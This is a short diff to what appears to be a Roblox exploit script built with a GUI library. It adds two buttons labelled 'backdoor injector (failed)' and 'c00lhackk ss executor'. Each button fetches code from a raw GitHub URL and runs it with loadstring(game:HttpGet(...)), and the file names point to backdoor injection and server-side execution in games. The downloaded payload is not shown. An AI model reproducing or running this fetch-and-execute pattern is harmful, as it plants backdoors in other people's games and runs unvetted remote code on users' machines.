@@ -128,6 +128,26 @@ local Button = TabForsaken:CreateButton({
 
 })                                                                                                                                                                                                    
 
+local Button = TabForsaken:CreateButton({
+
+   Name = "backdoor injector (failed)",
+
+   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Shadowhacksaw/Hi/refs/heads/main/c00lhackkbackdoor.injector"))()
+
+   end,
+
+})                                   
+
+local Button = TabForsaken:CreateButton({
+
+   Name = "c00lhackk ss executor",
+
+   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Shadowhacksaw/Hi/refs/heads/main/c00lhackkbackdoor.scanner"))()
+
+   end,
+
+})                                   
+
 local Section = TabDestroyUI:CreateSection("Destroy the ui")
 
 local Button = TabDestroyUI:CreateButton({
